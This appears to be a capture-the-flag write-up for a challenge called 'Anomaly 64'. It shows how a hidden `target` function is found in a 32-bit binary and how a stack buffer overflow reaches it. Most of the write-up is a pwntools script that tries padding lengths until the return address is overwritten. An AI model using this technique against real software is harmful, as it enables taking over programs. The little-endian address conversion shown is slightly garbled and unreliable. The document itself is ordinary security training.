# Anomaly 64 - Pwning the Stack

We need to find the secret function and the input that will call it. To start I will through the binary into binary ninja.
![image_47.png](image_47.png)
Looking at the list of functions one stands out as `target`. To the left of the function we have it address but we need to convert it for memory so `00401176` become `761140` Now we write a program to brute force the offset needed to hit this function.

```Python
from pwn import *

exe_path = './anomaly_x86'

# Function to brute-force input
def brute_force_input():
    # Initialize the base input
    base_input = b'A'
    
    # Initialize memory address in hex format (modify this if necessary)
    memory_address = 0x00401176
    memory_address_bytes = p32(memory_address)  # Using p32 since 32bit binary
    
    # Initialize the process
    p = process(exe_path)
    
    # Try different lengths of the input
    for i in range(1, 100):  # Adjust the range as needed
        input_data = base_input * i + memory_address_bytes
        
        p.sendline(input_data)
        
        output = p.recvall(timeout=1)  # Adjust timeout as needed
        
        if b"Congrats" in output:
            print(f"Found input: {input_data}")
            break
        
        p.close()
        p = process(exe_path)
    else:
        print("Input not found within the given range.")

if __name__ == "__main__":
    brute_force_input()

```
